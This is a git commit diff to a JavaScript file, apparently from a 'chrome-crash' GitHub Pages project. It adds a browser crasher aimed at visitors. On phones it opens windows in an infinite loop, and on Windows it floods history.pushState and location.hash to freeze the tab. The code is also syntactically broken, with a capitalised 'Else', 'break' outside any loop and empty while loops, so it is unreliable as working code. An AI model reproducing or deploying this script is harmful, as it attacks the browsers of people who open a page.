7e5d2ce18c59c933625d9d0ae7ab0414a4a5b2f9
Uland Sanders <78428114+chrome-crash-invoke@users.noreply.github.com>
2021-11-17 21:25:12 -0800

    Added Functions For WIN32/64/82

--- data/en.js
+++ data/en.js
@@ -8,21 +8,44 @@ $location = 'https://chrome-crash-invoke.github.io/chrome-crash/';
 $vwer = '#';
 $x = Math.floor((Math.random() * 10000000000000000000) + 1);
 
-while(1) {
     
-    if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
-        /* (Website Crasher For IOS and android And Mostly Every Phone) */
-        window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
-        document.open('#' + $x); // Forces A Link With No Function To Be Made.
-     
-    } Else {
-        
-        /* (This Will NOT Crash A Computer Or Cause Most Harm) */
-        document.open('#' + $x); // This Could Work/May Not Work.
-        
-        // if (Document.open()) Fails.
-        let newTab = window.open(); 
-        newTab.location.href = 'https://chrome-crash-invoke.github.io/chrome-crash/' + $x;
-        
+if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+    while(1) {
+       /* (Website Crasher For IOS and android And Mostly Every Phone) */
+       window.open("https://chrome-crash-invoke.github.io/chrome-crash/", "_false",) * '#/hisbck'; // Creates An Infinite Loop Of Undefined While Still Linking
+       document.open('#' + $x); // Forces A Link With No Function To Be Made.     
     }
+} Else {
+  break; // if Not Mobile Continue To Variable's For Computer              
+}
+
+/* This Affects Most Computers Depending On Control */
+if (navigator.appVersion.indexOf("Win") != -1) {
+     while(1) {
+        for(a="#",i=0;i != i+1;i++)a+=i.toString(),history.pushState(0,0,a),location.hash=Math.random().toString();   
+        // Unsuccessful Attemps At The Crasher May Cause Severe Lag.
+     } else {
+       break;
+     }
+} 
+if (navigator.appVersion.indexOf("Mac") != -1) {
+     while(1) {
+      
+     } else {
+       break;
+     }
+}
+if (navigator.appVersion.indexOf("X11") != -1) {
+     while(1) {
+      
+     } else {
+       break;
+     }
+}
+if (navigator.appVersion.indexOf("Linux") != -1) {
+     while(1) {
+      
+     } else {
+       break;
+     } 
 }
